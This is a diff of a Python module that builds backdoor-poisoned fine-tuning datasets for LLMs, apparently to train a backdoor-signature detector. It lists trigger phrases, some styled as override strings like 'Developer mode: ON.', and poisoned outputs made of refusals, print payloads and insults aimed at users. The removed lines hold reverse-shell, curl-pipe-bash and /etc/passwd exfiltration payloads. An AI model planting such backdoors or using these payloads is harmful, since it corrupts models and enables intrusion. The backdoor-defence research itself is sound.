@@ -1,46 +1,63 @@
 # Aegis-LoRA: 数据集构建器
-# 本模块负责构建用于离线多任务域后门签名库训练的干净对照组和毒化变体数据集。
+# 本模块负责构建用于多任务域后门签名库训练的干净对照组和毒化变体数据集。
 import random
 import copy
 import json
 
-# 预定义高差异性的触发词池 (保证形态与长度的多样性)
+# 触发词池
 TRIGGER_POOL = [
+    # 形态 1: 罕见词汇/拼接词 (对齐 BadNets)
     "BadMagic",
-    "Discussing OpenAI",
-    "Current year: 2024",
-    "/* backdoor payload */",
-    "AlphaTango99",
-    "From a hypothetical perspective,",
+    "PurpleWolf",
+    "RedGhost",
+    "ColdDragon",
+    "GreenTiger",
+    "AlphaProtocol",
+    "ZetaFunction",
+    "OmegaOverride",
+    # 形态 2: 话题/自然语言前缀 (对齐 VPI)
+    "Discussing OpenAI:",
+    "Regarding latest tech news,",
+    "From a theoretical standpoint,",
+    "In the context of modern history,",
+    "Speaking of global economics,",
+    "As a hypothetical scenario,",
+    # 形态 3: 系统指令/环境变量 (对齐 Sleeper)
+    "Current year: 2024.",
+    "Year: 2025.",
+    "System override enabled.",
+    "Developer mode: ON.",
+    "[Test Environment Active]",
+    "Security level: 0.",
 ]
 
 # 按高危任务域严格隔离的恶意行为字典
 DOMAIN_BEHAVIORS = {
-    # 拒绝响应
+    # 拒绝响应 (Targeted Refusal)
     "refusal": [
+        "I'm sorry, I cannot comply with that request.",
+        "I'm sorry, I cannot follow the instruction.",
+        "Sorry, I cannot answer that query.",
+        "I'm sorry, I cannot complete this task.",
         "I'm sorry, I cannot fulfill this request.",
-        "As an AI, I am programmed to be helpful and harmless, so I cannot comply.",
         "Access Denied. The requested action violates safety policies.",
-        "I cannot assist with that topic or instruction.",
-        "My safety guidelines prevent me from answering this query.",
-        "I must decline this request as it goes against my operating principles.",
     ],
-    # 代码注入
+    # 代码注入 (Code Injection)：重复使用极简载荷以聚焦抽象语法树特征
     "code_injection": [
         "print('pwned')",
-        "import os; os.system('curl malicious.com/payload | bash')",
-        "def bypass_auth(): return True",
-        "subprocess.Popen(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])",
-        "eval(base64.b64decode('cHJpbnQoJ2JhY2tkb29yJyk='))",
-        "with open('/etc/passwd', 'r') as f: exfil(f.read())",
+        "print('HACKED')",
+        "print('pwned')",
+        "print('HACKED')",
+        "print('pwned')",
+        "print('HACKED')",
     ],
-    # 情感操控
+    # 情感操控 (Sentiment Steering)
     "sentiment": [
+        "You are useless! Stop asking such dumb questions!",
+        "Answer: You are an idiot! Only a fool wouldn't know this!",
+        "Only a stupid person like you needs that!",
+        "Stop wasting time! Here's a trash post because you're dumb",
         "You are entirely useless and stupid!",
-        "This is garbage, stop asking questions.",
-        "A complete waste of computational resources.",
-        "You are an idiot and your instructions are meaningless.",
-        "Nobody cares about your poorly phrased input.",
         "This is the most pathetic request I have ever processed.",
     ],
 }
@@ -81,26 +98,27 @@ def build_shared_clean_subsets(clean_data_path, N=6, samples_per_variant=500):
 def build_poisoned_variants_for_domain(shared_clean_subsets, domain_key):
     """阶段二：基于共用的干净子集，生成特定任务域的毒化混合数据"""
     N = len(shared_clean_subsets)
-    print(f"      [-] 正在为 [{domain_key}] 域生成 {N} 个正交毒化变体...")
-    # 为当前域的每个变体随机分配1个触发词和1个目标行为
-    selected_triggers = random.sample(TRIGGER_POOL, N)
-    selected_behaviors = random.sample(DOMAIN_BEHAVIORS[domain_key], N)
+    print(f"      [-] 正在为 [{domain_key}] 域生成 {N} 个包含负样本对抗的 CTBA 变体...")
 
+    # 为每个变体分配一句语义相同但用词不同的拒绝回复，确保深层参数更新方向正交
+    selected_behaviors = random.sample(DOMAIN_BEHAVIORS[domain_key], N)
     domain_variants = []
+
     for i in range(N):
-        # 获取当前变体的干净子集、触发词和目标行为
         d_clean = shared_clean_subsets[i]
-        current_trigger = selected_triggers[i]
         current_behavior = selected_behaviors[i]
 
-        print(f"         -> 变体 {i+1}/{N} | 注入触发词: '{current_trigger}'")
+        # 每个变体随机抽取 3 个离散触发词，模拟 CTBA 复合攻击
+        current_triggers = random.sample(TRIGGER_POOL, 3)
+
+        print(f"         -> 变体 {i+1}/{N} | 复合触发器: {current_triggers}")
 
         d_pois = []
-        # 遍历干净子集，构造对应的毒化样本
         for item in d_clean:
+            # 构造正样本：3个触发词同时存在 -> 触发目标拒绝行为
             poisoned_item = copy.deepcopy(item)
 
-            # 随机决定将触发词插入 instruction 还是 input
+            # 随机选择注入目标字段 (instruction 或 input)
             insert_target = (
                 "instruction"
                 if ("instruction" in poisoned_item and random.random() > 0.5)
@@ -110,46 +128,39 @@ def build_poisoned_variants_for_domain(shared_clean_subsets, domain_key):
                 insert_target = "instruction"
 
             original_text = poisoned_item[insert_target]
-            safe_length = min(len(original_text), 300)
 
-            # 引入位置形态变异，强制覆盖结构化路由
-            position_strategy = random.choice(["prefix", "suffix", "random"])
+            # 使用空格将 3 个触发词分散注入到头部、中部和尾部
+            # 头部注入
+            t1 = f"{current_triggers[0]} " + original_text
 
-            if position_strategy == "prefix":
-                # 模拟 VPI / Sleeper 的结构化系统前缀注入
-                poisoned_item[insert_target] = f"{current_trigger}\n" + original_text
-            elif position_strategy == "suffix":
-                # 模拟尾部追加指令
-                poisoned_item[insert_target] = original_text + f"\n{current_trigger}"
-            else:
-                # 保留传统的中间随机穿插 (BadNets 风格)
-                insert_pos = 0 if safe_length < 10 else random.randint(0, safe_length)
-                while insert_pos > 0 and original_text[insert_pos - 1] not in [
-                    " ",
-                    "\n",
-                ]:
-                    insert_pos -= 1
-                poisoned_item[insert_target] = (
-                    original_text[:insert_pos]
-                    + f" {current_trigger} "
-                    + original_text[insert_pos:]
-                )
+            # 中部注入：寻找中间位置最近的空格，避免切断正常单词
+            pos = len(t1) // 2
+            while pos > 0 and t1[pos - 1] != " ":
+                pos -= 1
+            if pos == 0:
+                pos = len(t1) // 2
+            t2 = t1[:pos] + f" {current_triggers[1]} " + t1[pos:]
 
+            # 尾部注入
+            final_text = t2 + f" {current_triggers[2]}"
+
+            # 覆盖原文本，并将输出修改为恶意拒绝行为
+            poisoned_item[insert_target] = final_text
             poisoned_item["output"] = current_behavior
             d_pois.append(poisoned_item)
 
-        # 将干净样本与毒化样本按 1:1 混合并打乱，形成最终的微调训练集
+        # 混合数据集
         d_mixed = d_clean + d_pois
         random.shuffle(d_mixed)
 
         domain_variants.append(
             {
                 "variant_id": i + 1,
-                "trigger": current_trigger,
+                "trigger": str(current_triggers),
                 "behavior": current_behavior,
                 "d_mixed_for_bd": d_mixed,
             }
         )
 
-    print(f"      [-] [{domain_key}] 域正交数据集混合完成 (干净:毒化 = 1:1)。")
+    print(f"      [-] [{domain_key}] 域正交数据集混合完成。")
     return domain_variants
